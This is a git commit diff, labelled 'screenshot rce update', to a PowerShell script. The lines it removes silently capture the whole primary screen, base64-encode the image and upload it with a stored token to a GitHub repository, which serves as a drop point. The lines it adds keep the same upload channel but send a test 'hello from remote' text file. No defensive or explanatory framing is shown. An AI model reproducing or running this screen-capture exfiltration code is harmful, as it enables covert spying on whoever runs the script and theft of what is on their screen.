65ab592de8f0e5cf4a49084d50ba890eb9c2e0eb
0xa3f9 <270189507+0xa3f9@users.noreply.github.com>
2026-03-23 16:14:34 +0300

    screenshot rce update

--- a.sh
+++ a.sh
@@ -4,39 +4,17 @@ $token = $env:GH_TOKEN
 $user  = $env:GH_USER
 $repo  = $env:GH_REPO
 
-Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-$Screen = [System.Windows.Forms.Screen]::PrimaryScreen
-$Bitmap = New-Object System.Drawing.Bitmap $Screen.Bounds.Width, $Screen.Bounds.Height
-$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
-$Graphics.CopyFromScreen($Screen.Bounds.Location, [System.Drawing.Point]::Empty, $Screen.Bounds.Size)
+$textContent = "hello from remote"
+$base64Content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($textContent))
+$fileName = "msg-$(Get-Date -Format 'HHmmss').txt"
 
-$ms = New-Object System.IO.MemoryStream
-$Bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
-$base64Content = [Convert]::ToBase64String($ms.ToArray())
-
-$Graphics.Dispose(); $Bitmap.Dispose(); $ms.Dispose()
-
-$fileName = "ss-$(Get-Date -Format 'yyyyMMdd-HHmmss').png"
 $apiUrl = "https://api.github.com/repos/$user/$repo/contents/$fileName"
-$body = @{
-    message = "New Screenshot"
-    content = $base64Content
-} | ConvertTo-Json
-
-$headers = @{
-    "Authorization" = "token $token"
-    "Accept"        = "application/vnd.github.v3+json"
-}
+$body = @{ message="remote upload"; content=$base64Content } | ConvertTo-Json
+$headers = @{ "Authorization"="token $token"; "Accept"="application/vnd.github.v3+json" }
 
 try {
-    $res = Invoke-RestMethod -Uri $apiUrl -Method Put -Headers $headers -Body $body
-    Write-Host "Screenshot Public Link: https://raw.githubusercontent.com/$user/$repo/master/$fileName" -ForegroundColor Cyan
+    Invoke-RestMethod -Uri $apiUrl -Method Put -Headers $headers -Body $body -ErrorAction Stop
+    Write-Host "Uploaded $fileName to GitHub!" -ForegroundColor Green
 } catch {
-    Write-Error "Upload failed: $_"
+    Write-Host "Failed: $_" -ForegroundColor Red
 }
-
-
-
-
-
-
